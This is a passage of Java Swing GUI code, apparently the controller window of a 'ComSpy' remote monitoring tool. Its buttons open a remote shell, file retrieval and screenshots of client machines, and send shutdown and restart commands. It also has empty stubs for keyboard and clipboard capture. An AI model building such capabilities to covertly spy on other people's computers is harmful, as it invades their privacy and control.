    }//GEN-LAST:event_jButton6ActionPerformed

    private void jButton7ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton7ActionPerformed
        frmShell Shell = new frmShell(lblComputerIP.getText(), CurrentUUID);
        this.Insert(Shell, local.getString("btnShell") + " : " + CurrentComputerName);
    }//GEN-LAST:event_jButton7ActionPerformed

    private void jButton9ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton9ActionPerformed
        String[][] Data = new String[][]{
            {Server_Var.TYPE_COMMENT, Server_Var.SHUTDOWN},
            {Local_Var.TASKS_CUUID, CurrentUUID},};
        if (Server.DoneOrNot(Server.Contaner(Data))) {
            compy_client.ComSpy.MessageLog("Shutdown " + CurrentComputerName);
        } else {
            compy_client.ComSpy.MessageLog("Error Database");
        }
        pnShut.setVisible(false);
        WhoConnectedNow();
    }//GEN-LAST:event_jButton9ActionPerformed

    private void jButton10ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton10ActionPerformed
        String[][] Data = new String[][]{
            {Server_Var.TYPE_COMMENT, Server_Var.RESTART},
            {Local_Var.TASKS_CUUID, CurrentUUID},};
        if (Server.DoneOrNot(Server.Contaner(Data))) {
            compy_client.ComSpy.MessageLog("Restart " + CurrentComputerName);
        } else {
            compy_client.ComSpy.MessageLog("Error Database");
        }
        pnShut.setVisible(false);
        panelMenu1.setVisible(false);
        WhoConnectedNow();
    }//GEN-LAST:event_jButton10ActionPerformed

    private void jButton8ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton8ActionPerformed
        if (panelMenu1.isVisible()) {
            panelMenu1.setVisible(false);
        } else {
            panelMenu1.setVisible(true);
        }
    }//GEN-LAST:event_jButton8ActionPerformed

    private void jButton11ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton11ActionPerformed
        frmGetFiles Shell = new frmGetFiles(CurrentUUID, lblComputerIP.getText());
        this.Insert(Shell, local.getString("btnGetFiles") + " : " + CurrentComputerName);
    }//GEN-LAST:event_jButton11ActionPerformed

    private void jXBusyLabel1MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jXBusyLabel1MouseClicked
    }//GEN-LAST:event_jXBusyLabel1MouseClicked

    private void jButton12ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton12ActionPerformed
        frmScreenShut frmScreen = new frmScreenShut(CurrentUUID, this);
        this.Insert(frmScreen, local.getString("btnprtsc") + " : " + CurrentComputerName);
    }//GEN-LAST:event_jButton12ActionPerformed

    private void desktopPaneMouseMoved(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_desktopPaneMouseMoved
        if (panelMenu1.isVisible()) {
            panelMenu1.setVisible(false);
        }
    }//GEN-LAST:event_desktopPaneMouseMoved
    public void main() {
        try {
            UIManager.setLookAndFeel(new SyntheticaClassyLookAndFeel());
        } catch (UnsupportedLookAndFeelException | ParseException ex) {
            SetGUIViwe();
        }

        java.awt.EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                new MainControl().setVisible(true);
            }
        });
    }

    public void getKeybord() {

    }

    public void stopKeybord() {

    }

    public void getClibpord() {

    }

    public void stopClibpord() {

    }

    public void SetGUIViwe() {
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    if (OS.contains("linux")) {
                        javax.swing.UIManager.setLookAndFeel("com.sun.java.swing.plaf.gtk.GTKLookAndFeel");
                    }

                    if (OS.contains("windows")) {
                        javax.swing.UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");//info.getClassName()
                    }
                    break;
                }
            }
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(this.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
    }
    // Variables declaration - do not modify//GEN-BEGIN:variables
    public javax.swing.JDesktopPane desktopPane;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton10;
    private javax.swing.JButton jButton11;
    private javax.swing.JButton jButton12;
    private javax.swing.JButton jButton13;
    private javax.swing.JButton jButton2;
    private javax.swing.JButton jButton3;
    private javax.swing.JButton jButton4;
    private javax.swing.JButton jButton5;
    private javax.swing.JButton jButton6;
    private javax.swing.JButton jButton7;
    private javax.swing.JButton jButton8;
    private javax.swing.JButton jButton9;
    private javax.swing.JComboBox jComboBox1;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    public javax.swing.JToggleButton jToggleButton1;
    private javax.swing.JToggleButton jToggleButton2;
    private org.jdesktop.swingx.JXBusyLabel jXBusyLabel1;
    private javax.swing.JLabel lblComputerIP;
    private javax.swing.JLabel lblComputerName;
    private javax.swing.JLabel lblLoginDate;
    private javax.swing.JLabel lblLoginTime;
    private javax.swing.JLabel logomin;
    private javax.swing.JPanel panelMenu1;
    private javax.swing.JPanel pnShut;
    private javax.swing.JPanel toolbar;
    // End of variables declaration//GEN-END:variables

}
